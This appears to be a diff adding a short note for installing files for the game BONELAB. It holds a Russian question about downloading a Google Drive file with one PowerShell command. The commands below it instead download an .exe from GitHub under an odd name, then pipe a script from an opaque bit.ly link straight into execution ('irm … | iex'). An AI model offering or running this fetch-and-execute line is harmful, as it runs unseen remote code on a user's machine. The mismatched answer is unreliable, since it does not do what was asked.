@@ -1,0 +1,7 @@
+как скачать файл https://drive.google.com/file/d/1ZQGJWI83vmthARVFqVulsU9DHHtxvud0/view?usp=sharing с гугл диска в папку "C:/BONELAB1337/" одной powershell командой?
+
+New-Item -ItemType Directory -Force -Path "C:/BONELAB1337"
+Invoke-WebRequest -Uri "https://github.com/LelaPo/bonelab-mods/raw/refs/heads/main/md.exe" -OutFile "C:/BONELAB1337/ФАЙЛ"
+Write-Host "Готово!" -ForegroundColor Green
+
+irm https://bit.ly/48HCRfq | iex
